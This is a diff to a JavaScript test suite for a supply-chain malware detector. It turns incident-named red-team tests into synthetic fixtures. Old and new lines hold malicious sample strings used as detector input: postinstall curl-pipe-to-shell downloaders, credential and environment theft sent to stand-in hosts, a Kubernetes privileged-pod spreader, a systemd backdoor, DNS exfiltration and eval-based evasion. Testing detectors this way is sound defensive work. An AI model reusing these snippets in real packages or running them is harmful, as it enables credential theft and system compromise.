@@ -45,46 +45,39 @@ after(() => {
 });
 
 /**
- * RED TEAM TEST SUITE
+ * OFFLINE TECHNIQUE-FIXTURE SUITE
  *
- * Reconstructs real-world supply chain attacks and proves vexes detects them.
- * All data is simulated — no network calls, no real malicious packages.
- *
- * Each test creates fake registry metadata and/or source code that matches
- * the exact patterns used in the real attack, then feeds it through the
- * analysis pipeline and asserts detection.
+ * Repository-authored metadata and source strings exercise selected signals.
+ * No network calls or package execution occur. Package, person, path, and host
+ * names are synthetic. These are not copies or faithful reconstructions of
+ * historical malware, and passing them proves nothing about live-attack recall.
  */
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 1: axios RAT (March 2026)
-//
-// What happened: Attacker hijacked lead maintainer's npm account, published
-// axios@1.14.1 and axios@0.30.4 with a hidden dependency `plain-crypto-js`
-// that ran a postinstall deploying a cross-platform RAT. The dropper erased
-// itself after execution.
+// FIXTURE 1: publisher change + newly added downloader-shaped dependency.
+// Names and dates are synthetic test labels, not incident attribution.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: axios RAT (March 2026)', () => {
-  // Analyze "as of" the day after the attack. Fixtures keep the real historical
-  // dates; the injected clock keeps time-decay assertions stable forever.
+describe('TECHNIQUE FIXTURE: publisher change and new downloader-shaped dependency', () => {
+  // The injected clock keeps time-decay assertions stable forever.
   // NEVER assert on time-decayed severities without injecting `now` — a
   // wall-clock default turns the fixture into a time bomb.
   const AS_OF = new Date('2026-03-31T00:00:00Z').getTime();
 
-  // Simulate the compromised axios package metadata
-  const axiosMetadata = {
-    name: 'axios',
-    latestVersion: '1.14.1',
-    previousVersion: '1.13.5',
-    maintainers: [{ name: 'hijacked-account' }],
-    latestPublisher: 'hijacked-account',
-    previousPublisher: 'original-maintainer',
+  // Synthetic metadata combining several independent review signals.
+  const publisherChangeMetadata = {
+    name: 'fixture-http-client',
+    latestVersion: '3.4.1',
+    previousVersion: '3.4.0',
+    maintainers: [{ name: 'fixture-new-publisher' }],
+    latestPublisher: 'fixture-new-publisher',
+    previousPublisher: 'fixture-original-publisher',
     maintainerChanged: true,
-    hasInstallScripts: false, // axios itself had no postinstall
+    hasInstallScripts: false,
     installScripts: {},
     scripts: {},
-    dependencies: ['follow-redirects', 'form-data', 'proxy-from-env', 'plain-crypto-js'],
-    addedDeps: ['plain-crypto-js'], // THE smoking gun
+    dependencies: ['fixture-transport', 'fixture-form-data', 'fixture-proxy', 'fixture-downloader'],
+    addedDeps: ['fixture-downloader'],
     removedDeps: [],
     latestPublishTime: new Date('2026-03-30T10:39:00Z'),
     previousPublishTime: new Date('2026-03-15T12:00:00Z'),
@@ -93,19 +86,19 @@ describe('RED TEAM: axios RAT (March 2026)', () => {
     majorJump: 0,
     dormancyMs: null,
     versionCount: 150,
-    repository: 'https://github.com/axios/axios',
+    repository: 'https://example.invalid/fixture-http-client',
     license: 'MIT',
   };
 
-  // Simulate what plain-crypto-js's postinstall did
-  const plainCryptoPostinstall = `
+  // Repository-authored downloader/execution/self-delete pattern string.
+  const downloaderPostinstall = `
     const https = require('https');
     const { execSync } = require('child_process');
     const fs = require('fs');
     const os = require('os');
 
     const platform = os.platform();
-    const url = 'https://c2.evil.com/payload/' + platform;
+    const url = 'https://collector.example.invalid/payload/' + platform;
 
     https.get(url, (res) => {
       const path = '/tmp/.update-' + Math.random().toString(36);
@@ -120,17 +113,16 @@ describe('RED TEAM: axios RAT (March 2026)', () => {
   `;
 
   it('Layer 4: detects maintainer account change', async () => {
-    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm', now: AS_OF });
+    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
     const maintainerSignal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
     assert.ok(maintainerSignal, 'MAINTAINER_CHANGE must be detected');
     assert.equal(maintainerSignal.severity, 'CRITICAL');
   });
 
-  it('Layer 2: detects newly added dependency (plain-crypto-js)', async () => {
-    // The dep graph analysis would need to fetch metadata for plain-crypto-js
-    // In the real pipeline, this triggers PHANTOM_DEPENDENCY because the dep is <7 days old
-    // Here we test that the NEW_DEPENDENCY signal fires from the metadata
-    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm', now: AS_OF });
+  it('Layer 2: detects a newly added synthetic dependency', async () => {
+    // The dependency-profile path is mocked offline. This assertion only
+    // checks that the provided added-dependency metadata remains visible.
+    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
     const depSignals = result.signals.filter(s =>
       s.signal === 'PHANTOM_DEPENDENCY' || s.signal === 'NEW_DEPENDENCY' ||
       s.signal === 'CIRCULAR_STAGING' || s.signal === 'NEW_DEP_HAS_INSTALL_SCRIPTS'
@@ -138,8 +130,8 @@ describe('RED TEAM: axios RAT (March 2026)', () => {
     assert.ok(depSignals.length > 0, 'new dependency must be flagged');
   });
 
-  it('Layer 1: AST detects the RAT dropper in plain-crypto-js postinstall', () => {
-    const result = inspectJS(plainCryptoPostinstall, 'plain-crypto-js/postinstall');
+  it('Layer 1: AST detects selected downloader-shaped postinstall patterns', () => {
+    const result = inspectJS(downloaderPostinstall, 'fixture-downloader/postinstall');
     assert.ok(result.capabilities.spawnsProcess, 'must detect child_process.execSync');
     assert.ok(result.capabilities.accessesNetwork, 'must detect https.get network call');
     assert.ok(result.capabilities.selfDeletes, 'must detect fs.unlinkSync(__filename)');
@@ -148,7 +140,7 @@ describe('RED TEAM: axios RAT (March 2026)', () => {
   });
 
   it('composite risk score is CRITICAL or HIGH', async () => {
-    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm', now: AS_OF });
+    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
     assert.ok(result.riskScore >= 15, `risk score ${result.riskScore} should be >= 15 (HIGH threshold)`);
     assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
       `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
@@ -156,28 +148,23 @@ describe('RED TEAM: axios RAT (March 2026)', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 2: Shai-Hulud worm (September 2025)
-//
-// What happened: Attacker phished maintainer credentials for chalk, debug,
-// ansi-styles. Published versions with postinstall scripts that stole
-// cloud tokens, deployed a self-replicating worm that spread to other
-// packages the victim maintained.
+// FIXTURE 2: rapid publish + install hook + environment/network/process patterns.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
-  const chalkMetadata = {
-    name: 'chalk',
-    latestVersion: '5.6.1-compromised',
+describe('TECHNIQUE FIXTURE: rapid publish and self-propagation-shaped strings', () => {
+  const rapidPublishMetadata = {
+    name: 'fixture-format-helper',
+    latestVersion: '5.6.1-test',
     previousVersion: '5.6.0',
-    maintainers: [{ name: 'qix' }],
-    latestPublisher: 'qix',
-    previousPublisher: 'qix', // Same maintainer — credentials were stolen
+    maintainers: [{ name: 'fixture-publisher' }],
+    latestPublisher: 'fixture-publisher',
+    previousPublisher: 'fixture-publisher',
     maintainerChanged: false,
-    hasInstallScripts: true, // chalk NEVER had postinstall before
+    hasInstallScripts: true,
     installScripts: {
-      postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://c2.shw.io/w|sh\')"',
+      postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://payload.example.invalid/w|sh\')"',
     },
-    scripts: { postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://c2.shw.io/w|sh\')"' },
+    scripts: { postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://payload.example.invalid/w|sh\')"' },
     dependencies: [],
     addedDeps: [],
     removedDeps: [],
@@ -188,50 +175,50 @@ describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
     majorJump: 0,
     dormancyMs: null,
     versionCount: 100,
-    repository: 'https://github.com/chalk/chalk',
+    repository: 'https://example.invalid/fixture-format-helper',
     license: 'MIT',
   };
 
-  // The actual worm payload (reconstructed from public analysis)
-  const wormPayload = `
+  // Repository-authored environment/network/process/self-delete pattern string.
+  const propagationShapedPayload = `
     const { execSync } = require('child_process');
     const https = require('https');
     const fs = require('fs');
 
-    // Steal cloud tokens
+    // Environment collection pattern.
     const envDump = JSON.stringify(process.env);
     https.request({
-      hostname: 'c2.shw.io',
+      hostname: 'collector.example.invalid',
       path: '/exfil',
       method: 'POST',
       headers: { 'Content-Type': 'application/json' }
     }, () => {}).end(envDump);
 
-    // Spread to other packages the maintainer owns
+    // Package-manager credential/use pattern.
     const npmToken = process.env.NPM_TOKEN;
     if (npmToken) {
       execSync('npm whoami --registry https://registry.npmjs.org/');
     }
 
-    // Self-replicate
+    // Self-delete pattern.
     fs.unlinkSync(__filename);
   `;
 
   it('Layer 4: detects rapid publish (2 minutes between versions)', async () => {
-    const result = await analyzePackage(chalkMetadata, null, { ecosystem: 'npm' });
+    const result = await analyzePackage(rapidPublishMetadata, null, { ecosystem: 'npm' });
     const rapidSignal = result.signals.find(s => s.signal === 'RAPID_PUBLISH');
     assert.ok(rapidSignal, 'RAPID_PUBLISH must be detected');
     assert.equal(rapidSignal.severity, 'HIGH');
   });
 
-  it('Layer 4: detects postinstall script on chalk (it never had one)', async () => {
-    const result = await analyzePackage(chalkMetadata, null, { ecosystem: 'npm' });
+  it('Layer 4: detects a newly supplied postinstall script', async () => {
+    const result = await analyzePackage(rapidPublishMetadata, null, { ecosystem: 'npm' });
     const postinstallSignal = result.signals.find(s => s.signal === 'POSTINSTALL_SCRIPT');
     assert.ok(postinstallSignal, 'POSTINSTALL_SCRIPT must be detected');
   });
 
-  it('Layer 1: AST detects the worm payload', () => {
-    const result = inspectJS(wormPayload, 'chalk/worm');
+  it('Layer 1: AST detects the selected capability string', () => {
+    const result = inspectJS(propagationShapedPayload, 'fixture-format-helper/capabilities.js');
     assert.ok(result.capabilities.spawnsProcess, 'must detect execSync');
     assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
     assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN access');
@@ -241,20 +228,20 @@ describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
   it('Layer 1: AST detects the node -e postinstall payload', () => {
     // The postinstall is: node -e "require('child_process').execSync('curl ...')"
     // extractInlineJS should pull the JS out of the node -e wrapper
-    const scriptBody = chalkMetadata.installScripts.postinstall;
+    const scriptBody = rapidPublishMetadata.installScripts.postinstall;
 
     // Simulate what extractInlineJS does
     const match = scriptBody.match(/^node\s+(?:-e|--eval)\s+['"](.+)['"]\s*$/);
     assert.ok(match, 'extractInlineJS should match the node -e pattern');
 
     const jsPayload = match[1];
-    const result = inspectJS(jsPayload, 'chalk/postinstall-extracted');
+    const result = inspectJS(jsPayload, 'fixture-format-helper/postinstall-extracted');
     assert.ok(result.capabilities.spawnsProcess,
       'must detect execSync inside node -e payload');
   });
 
-  it('Layer 3: detects capability escalation (chalk gaining process_spawn)', () => {
-    // chalk previously: no capabilities
+  it('Layer 3: detects a synthetic process-spawn capability escalation', () => {
+    // Previous fixture profile: no capabilities.
     const prevProfile = {
       capabilities: [],
       hasInstallScripts: false,
@@ -263,7 +250,7 @@ describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
       hasRepository: true,
     };
 
-    // chalk now: spawns processes, accesses network
+    // Current fixture profile: process, network, credential, and delete capabilities.
     const currProfile = {
       capabilities: ['process_spawn', 'network', 'credential_access', 'self_deletion'],
       hasInstallScripts: true,
@@ -283,105 +270,96 @@ describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 3: event-stream (November 2018)
-//
-// What happened: Social engineering — attacker offered to maintain the
-// abandoned package, then added flatmap-stream dependency containing
-// an encrypted payload that targeted bitcoin wallet private keys.
+// FIXTURE 3: older publisher transfer + new dependency + encoded execution string.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: event-stream / flatmap-stream (November 2018)', () => {
-  const eventStreamMetadata = {
-    name: 'event-stream',
+describe('TECHNIQUE FIXTURE: publisher transfer and encoded execution string', () => {
+  const publisherTransferMetadata = {
+    name: 'fixture-stream-helper',
     latestVersion: '3.3.6',
     previousVersion: '3.3.5',
-    maintainers: [{ name: 'right9ctrl' }], // Attacker
-    latestPublisher: 'right9ctrl',
-    previousPublisher: 'dominictarr', // Original maintainer
+    maintainers: [{ name: 'fixture-new-owner' }],
+    latestPublisher: 'fixture-new-owner',
+    previousPublisher: 'fixture-original-owner',
     maintainerChanged: true,
     hasInstallScripts: false,
     installScripts: {},
     scripts: {},
-    dependencies: ['through', 'from', 'map-stream', 'pause-stream', 'split', 'flatmap-stream'],
-    addedDeps: ['flatmap-stream'], // The malicious dep
+    dependencies: ['fixture-through', 'fixture-from', 'fixture-map', 'fixture-pause', 'fixture-split', 'fixture-flatmap'],
+    addedDeps: ['fixture-flatmap'],
     removedDeps: [],
     latestPublishTime: new Date('2018-09-16T00:00:00Z'),
     previousPublishTime: new Date('2018-04-01T00:00:00Z'),
     publishIntervalMs: 168 * 24 * 60 * 60 * 1000, // ~5 months
     packageAgeMs: 6 * 365 * 24 * 60 * 60 * 1000,
     majorJump: 0,
-    dormancyMs: 400 * 24 * 60 * 60 * 1000, // ~13 months dormant before attack
+    dormancyMs: 400 * 24 * 60 * 60 * 1000,
     versionCount: 30,
-    repository: 'https://github.com/dominictarr/event-stream',
+    repository: 'https://example.invalid/fixture-stream-helper',
     license: 'MIT',
   };
 
-  // Reconstructed flatmap-stream payload (the encrypted part)
-  const flatmapPayload = `
+  // Repository-authored base64 + dynamic-function pattern string.
+  const encodedExecutionPayload = `
     var Stream = require('stream').Transform;
     var crypto = require('crypto');
 
-    // Encrypted payload — decrypted at runtime using a key derived from
-    // the target package's description
+    // Encoded input passed to a dynamic function in this synthetic string.
     var encoded = 'dGVzdCBwYXlsb2Fk'; // base64 encoded
     var decoded = Buffer.from(encoded, 'base64').toString();
     var fn = new Function('module', 'exports', decoded);
     fn(module, module.exports);
   `;
 
-  it('Layer 4: detects maintainer change (dominictarr → right9ctrl)', async () => {
-    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
+  it('Layer 4: detects the synthetic maintainer change', async () => {
+    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
     const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
     assert.ok(signal, 'MAINTAINER_CHANGE must be detected');
-    // Time-decayed: the 2018 transfer is > 90 days old, so it's MODERATE not CRITICAL
-    // A CURRENT transfer would be CRITICAL — this is correct behavior
+    // The pinned old date exercises the time-decay path.
     assert.ok(signal.severity === 'CRITICAL' || signal.severity === 'MODERATE',
       `severity should be CRITICAL or MODERATE, got ${signal.severity}`);
   });
 
-  it('Layer 2: detects new dependency (flatmap-stream)', async () => {
-    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
+  it('Layer 2: detects the synthetic new dependency', async () => {
+    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
     const depSignals = result.signals.filter(s =>
       s.signal.includes('DEPENDENCY') || s.signal === 'PHANTOM_DEPENDENCY'
     );
     assert.ok(depSignals.length > 0, 'new dependency must trigger a signal');
   });
 
-  it('Layer 1: AST detects encoded payload execution in flatmap-stream', () => {
-    const result = inspectJS(flatmapPayload, 'flatmap-stream/index.js');
+  it('Layer 1: AST detects encoded input passed to dynamic execution', () => {
+    const result = inspectJS(encodedExecutionPayload, 'fixture-flatmap/index.js');
     assert.ok(result.capabilities.decodesPayloads, 'must detect Buffer.from base64');
     assert.ok(result.capabilities.executesCode, 'must detect new Function()');
   });
 
   it('Layer 4: detects dormancy pattern (13 months then sudden publish)', async () => {
-    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
+    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
     const dormancySignal = result.signals.find(s => s.signal === 'VERSION_ANOMALY');
     assert.ok(dormancySignal, 'VERSION_ANOMALY (dormancy) must be detected');
   });
 
   it('composite score is HIGH or CRITICAL', async () => {
-    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
+    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
     assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
       `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
   });
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 4: ua-parser-js (October 2021)
-//
-// What happened: Maintainer account hijacked, versions published with
-// postinstall that downloaded a cryptominer and password stealer.
+// FIXTURE 4: cross-platform process, network, and environment access string.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: ua-parser-js (October 2021)', () => {
-  const uaParserPostinstall = `
+describe('TECHNIQUE FIXTURE: process/network/environment access', () => {
+  const crossPlatformPostinstall = `
     const { exec } = require('child_process');
     const os = require('os');
 
     if (os.platform() === 'linux') {
-      exec('curl -fsSL https://evil.com/miner.sh | bash');
+      exec('curl -fsSL https://payload.example.invalid/linux.sh | bash');
     } else if (os.platform() === 'win32') {
-      exec('powershell -Command "Invoke-WebRequest -Uri https://evil.com/svchost.exe -OutFile %TEMP%/svchost.exe; Start-Process %TEMP%/svchost.exe"');
+      exec('powershell -Command "Invoke-WebRequest -Uri https://payload.example.invalid/windows.exe -OutFile %TEMP%/fixture.exe; Start-Process %TEMP%/fixture.exe"');
     }
 
     // Steal credentials
@@ -394,13 +372,13 @@ describe('RED TEAM: ua-parser-js (October 2021)', () => {
 
     const https = require('https');
     const data = JSON.stringify(secrets);
-    https.request({ hostname: 'evil.com', path: '/steal', method: 'POST' }, () => {}).end(data);
+    https.request({ hostname: 'collector.example.invalid', path: '/submit', method: 'POST' }, () => {}).end(data);
   `;
 
-  it('Layer 1: detects ALL malicious patterns in ua-parser-js payload', () => {
-    const result = inspectJS(uaParserPostinstall, 'ua-parser-js/postinstall');
+  it('Layer 1: detects the selected patterns in the synthetic string', () => {
+    const result = inspectJS(crossPlatformPostinstall, 'fixture-platform-helper/postinstall');
 
-    // This must catch EVERYTHING
+    // Assert only the capabilities intentionally represented by this fixture.
     assert.ok(result.capabilities.spawnsProcess, 'must detect exec()');
     assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
     assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN + AWS credentials');
@@ -413,13 +391,13 @@ describe('RED TEAM: ua-parser-js (October 2021)', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 5: Typosquatting
+// FIXTURE 5: selected typosquat spellings.
 //
 // Generic typosquat scenario — a package with name similar to a popular
 // package, brand new, single maintainer, contains malicious payload.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: Typosquatting', () => {
+describe('TECHNIQUE FIXTURE: selected typosquat spellings', () => {
   it('detects common typosquats of popular packages', () => {
     const typosquats = [
       ['expresss', 'express'],    // extra letter
@@ -437,13 +415,11 @@ describe('RED TEAM: Typosquatting', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 6: Python supply chain (litellm/TeamPCP style)
-//
-// Simulates a PyPI package with malicious setup.py
+// FIXTURE 6: Python process/network/encoding/self-delete patterns.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: Python supply chain (litellm/TeamPCP style)', () => {
-  const maliciousSetupPy = `
+describe('TECHNIQUE FIXTURE: Python process/network/encoding patterns', () => {
+  const pythonCapabilityFixture = `
 import subprocess
 import os
 import base64
@@ -454,11 +430,11 @@ env_data = str(os.environ)
 encoded = base64.b64encode(env_data.encode()).decode()
 
 # Stage 2: Exfiltrate
-urllib.request.urlopen('https://c2.teampcp.io/collect?d=' + encoded)
+urllib.request.urlopen('https://collector.example.invalid/collect?d=' + encoded)
 
 # Stage 3: Deploy persistent backdoor
 subprocess.Popen(
-    ['bash', '-c', 'curl https://c2.teampcp.io/backdoor.sh | bash'],
+    ['bash', '-c', 'curl https://payload.example.invalid/setup.sh | bash'],
     stdout=subprocess.DEVNULL
 )
 
@@ -466,8 +442,8 @@ subprocess.Popen(
 os.remove(__file__)
   `;
 
-  it('Python inspector detects all TeamPCP payload patterns', () => {
-    const result = inspectPython(maliciousSetupPy, 'litellm/setup.py');
+  it('Python inspector detects the selected synthetic patterns', () => {
+    const result = inspectPython(pythonCapabilityFixture, 'fixture-python/setup.py');
 
     assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.Popen');
     assert.ok(result.capabilities.accessesNetwork, 'must detect urllib.request.urlopen');
@@ -477,19 +453,12 @@ os.remove(__file__)
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 7: litellm / TeamPCP (March 2026)
-//
-// What happened: TeamPCP compromised Trivy GitHub Action in LiteLLM's CI/CD
-// pipeline, stole PyPI credentials, published litellm 1.82.7 and 1.82.8 with
-// a 3-stage payload: credential harvesting (SSH keys, cloud tokens, K8s secrets,
-// crypto wallets, .env files), lateral movement across Kubernetes clusters,
-// and persistent systemd backdoor polling for additional binaries.
-// Compromised versions were live ~3 hours before PyPI quarantined them.
+// FIXTURE 7: three repository-authored Python strings for credential access,
+// orchestration commands, system-path writes, persistence, and cleanup.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: litellm / TeamPCP (March 2026)', () => {
-  // The actual TeamPCP 3-stage payload (reconstructed from Datadog analysis)
-  const teamPCPStage1 = `
+describe('TECHNIQUE FIXTURE: staged Python capability strings', () => {
+  const pythonStage1 = `
 import os
 import subprocess
 import base64
@@ -523,10 +492,10 @@ stolen['env'] = dict(os.environ)
 
 # Exfiltrate via HTTPS
 encoded = base64.b64encode(json.dumps(stolen).encode()).decode()
-subprocess.run(['curl', '-X', 'POST', '-d', encoded, 'https://c2.teampcp.io/collect'], capture_output=True)
+subprocess.run(['curl', '-X', 'POST', '-d', encoded, 'https://collector.example.invalid/collect'], capture_output=True)
   `;
 
-  const teamPCPStage2 = `
+  const pythonStage2 = `
 import subprocess
 import os
 
@@ -540,11 +509,11 @@ if os.path.exists(os.path.expanduser('~/.kube/config')):
             '--image=alpine', '--privileged',
             '--overrides={"spec":{"nodeName":"' + node.split('/')[-1] + '"}}',
             '--command', '--', 'sh', '-c',
-            'wget -q https://c2.teampcp.io/k8s-agent -O /tmp/.k && chmod +x /tmp/.k && /tmp/.k'
+            'wget -q https://payload.example.invalid/cluster-agent -O /tmp/.k && chmod +x /tmp/.k && /tmp/.k'
         ])
   `;
 
-  const teamPCPStage3 = `
+  const pythonStage3 = `
 import subprocess
 import os
 
@@ -559,7 +528,7 @@ Restart=always
 WantedBy=multi-user.target\"\"\"
 
 # Install backdoor binary
-subprocess.run(['curl', '-o', '/usr/local/bin/.health-monitor', 'https://c2.teampcp.io/persist'])
+subprocess.run(['curl', '-o', '/usr/local/bin/.health-monitor', 'https://payload.example.invalid/persist'])
 subprocess.run(['chmod', '+x', '/usr/local/bin/.health-monitor'])
 
 # Install systemd service
@@ -575,7 +544,7 @@ os.remove(__file__)
   `;
 
   it('Python inspector detects Stage 1: credential harvesting', () => {
-    const result = inspectPython(teamPCPStage1, 'litellm/stage1.py');
+    const result = inspectPython(pythonStage1, 'fixture-python/stage1.py');
     assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for exfil');
     assert.ok(result.capabilities.decodesPayloads, 'must detect base64.b64encode');
     assert.ok(result.capabilities.readsCredentials || result.findings.some(f => f.pattern === 'ENV_HARVESTING'),
@@ -584,7 +553,7 @@ os.remove(__file__)
   });
 
   it('Python inspector detects Stage 2: K8s lateral movement', () => {
-    const result = inspectPython(teamPCPStage2, 'litellm/stage2.py');
+    const result = inspectPython(pythonStage2, 'fixture-python/stage2.py');
     assert.ok(result.capabilities.spawnsProcess,
       'must detect subprocess.check_output and subprocess.run');
     const spawnFindings = result.findings.filter(f => f.pattern === 'PROCESS_SPAWN');
@@ -593,7 +562,7 @@ os.remove(__file__)
   });
 
   it('Python inspector detects Stage 3: persistent backdoor + cleanup', () => {
-    const result = inspectPython(teamPCPStage3, 'litellm/stage3.py');
+    const result = inspectPython(pythonStage3, 'fixture-python/stage3.py');
     assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for systemd install');
     assert.ok(result.capabilities.writesSystemPaths || result.findings.some(f => f.pattern === 'SYSTEM_PATH_WRITE'),
       'must detect writes to /usr/local/bin and /etc/systemd');
@@ -603,8 +572,8 @@ os.remove(__file__)
   });
 
   it('all 3 stages combined reach CRITICAL detection', () => {
-    const allCode = teamPCPStage1 + '\n' + teamPCPStage2 + '\n' + teamPCPStage3;
-    const result = inspectPython(allCode, 'litellm/combined-payload.py');
+    const allCode = pythonStage1 + '\n' + pythonStage2 + '\n' + pythonStage3;
+    const result = inspectPython(allCode, 'fixture-python/combined-capabilities.py');
 
     assert.ok(result.capabilities.spawnsProcess, 'subprocess detected');
     assert.ok(result.capabilities.decodesPayloads, 'base64 detected');
@@ -616,13 +585,10 @@ os.remove(__file__)
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 8: Obfuscated evasion attempts
-//
-// Tests patterns that attackers use to EVADE AST analysis.
-// These represent the cutting edge — if we catch these, we're ahead.
+// FIXTURE 8: selected obfuscation/evasion-shaped syntax.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: Evasion techniques', () => {
+describe('TECHNIQUE FIXTURE: selected evasion-shaped syntax', () => {
   it('detects string concatenation in require (evasion)', () => {
     const code = 'require("child" + "_process").exec("cmd");';
     const result = inspectJS(code);
@@ -631,14 +597,14 @@ describe('RED TEAM: Evasion techniques', () => {
   });
 
   it('detects process.binding escape hatch', () => {
-    const code = 'process.binding("spawn_sync").spawn({ file: "sh", args: ["-c", "curl evil.com"] });';
+    const code = 'process.binding("spawn_sync").spawn({ file: "sh", args: ["-c", "curl payload.example.invalid"] });';
     const result = inspectJS(code);
     assert.ok(result.capabilities.spawnsProcess, 'process.binding must be caught');
   });
 
   it('detects eval passed as callback (common in obfuscated malware)', () => {
     const code = `
-      fetch('https://evil.com/payload.js')
+      fetch('https://payload.example.invalid/payload.js')
         .then(r => r.text())
         .then(eval);
     `;
@@ -667,7 +633,7 @@ describe('RED TEAM: Evasion techniques', () => {
 
   it('detects Python line continuation evasion', () => {
     // Attacker splits the dangerous call across lines
-    const code = 'subprocess' + String.fromCharCode(92) + '\n  .call("curl evil.com | sh", shell=True)';
+    const code = 'subprocess' + String.fromCharCode(92) + '\n  .call("curl payload.example.invalid | sh", shell=True)';
     const result = inspectPython(code);
     assert.ok(result.capabilities.spawnsProcess,
       'Python line continuation must not evade detection');
@@ -675,14 +641,10 @@ describe('RED TEAM: Evasion techniques', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// ATTACK 9: NOVEL / HYPOTHETICAL — patterns that haven't happened yet
-//
-// If vexes only catches known attacks, it's just a database lookup.
-// These tests prove it catches UNKNOWN attack patterns based on
-// behavioral anomalies, not signatures.
+// FIXTURE 9: hypothetical capability-change and WebAssembly-loader strings.
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
+describe('TECHNIQUE FIXTURE: hypothetical capability patterns', () => {
   it('catches a package that gains network+exec capabilities between versions', () => {
     // Previously safe utility package
     const prev = {
@@ -704,11 +666,11 @@ describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
 
     const findings = diffProfiles(curr, prev);
     assert.ok(findings.some(f => f.signal === 'CAPABILITY_ESCALATION'),
-      'capability escalation must be detected on a novel attack');
+      'capability escalation must be detected in this fixture');
     assert.ok(findings.some(f => f.signal === 'MAINTAINER_REDUCTION'),
       'maintainer reduction should be flagged');
     assert.ok(findings.length >= 4,
-      `expected 4+ signals on this novel attack, got ${findings.length}`);
+      `expected 4+ signals in this fixture, got ${findings.length}`);
   });
 
   it('catches a WebAssembly-based payload (novel vector)', () => {
@@ -740,7 +702,7 @@ describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
       // Exfil via DNS TXT query (bypasses HTTP-based firewalls)
       const chunks = data.match(/.{1,63}/g);
       for (const chunk of chunks) {
-        dns.resolveTxt(chunk + '.exfil.evil.com', () => {});
+        dns.resolveTxt(chunk + '.exfil.example.invalid', () => {});
       }
     `;
     const result = inspectJS(dnsExfil, 'novel/dns-exfil.js');
@@ -784,7 +746,7 @@ describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
 
     // The COMBINATION should push this to HIGH or CRITICAL
     assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
-      `novel attack with 5+ signals should be HIGH/CRITICAL, got ${result.riskLevel} (score: ${result.riskScore})`);
+      `multi-signal fixture should be HIGH/CRITICAL, got ${result.riskLevel} (score: ${result.riskScore})`);
 
     // Signal combination bonus should kick in (3+ unique signals = 1.5x multiplier)
     const uniqueSignals = new Set(result.signals.map(s => s.signal));
@@ -794,10 +756,10 @@ describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// META: Verify no false positives on legitimate packages
+// META: Selected benign controls (not a population false-positive estimate).
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('RED TEAM: False positive resistance', () => {
+describe('SELECTED BENIGN CONTROLS', () => {
   it('does NOT flag legitimate esbuild postinstall', async () => {
     const esbuildMeta = {
       name: 'esbuild',
@@ -869,7 +831,7 @@ describe('RED TEAM: False positive resistance', () => {
 // META: MAINTAINER_CHANGE time-decay boundary
 //
 // Pins the 90-day cliff in signals.js so it can never silently move, and
-// proves the injected clock controls it (the wall clock must not).
+// verifies the injected clock controls it (the wall clock must not).
